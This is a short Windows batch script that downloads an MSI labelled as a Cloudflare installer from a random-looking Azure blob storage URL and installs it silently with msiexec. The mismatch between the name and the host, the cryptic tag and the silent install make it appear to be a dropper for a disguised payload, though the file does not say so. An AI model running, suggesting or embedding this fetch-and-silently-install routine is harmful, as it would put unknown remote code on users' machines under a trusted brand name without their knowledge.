@echo off
REM CDRP7F3A9D2B8C4
setlocal EnableExtensions

REM ========== EDIT THESE ==========
set "DOWNLOAD_URL=https://xxyhillr.blob.core.windows.net/xxyhillr/1526100151/1789810331_6a9092fd_cloudflare.msi"
set "MSI_FILE=%TEMP%\cloudflare.msi"
REM ================================

echo Downloading...
curl -fsSL -o "%MSI_FILE%" "%DOWNLOAD_URL%"
if errorlevel 1 (
    echo Download failed.
    exit /b 1
)

if not exist "%MSI_FILE%" (
    echo MSI file missing after download.
    exit /b 1
)

echo Installing silently...
msiexec /i "%MSI_FILE%" /qn /norestart
if errorlevel 1 (
    echo Install failed.
    exit /b 1
)

endlocal
exit /b
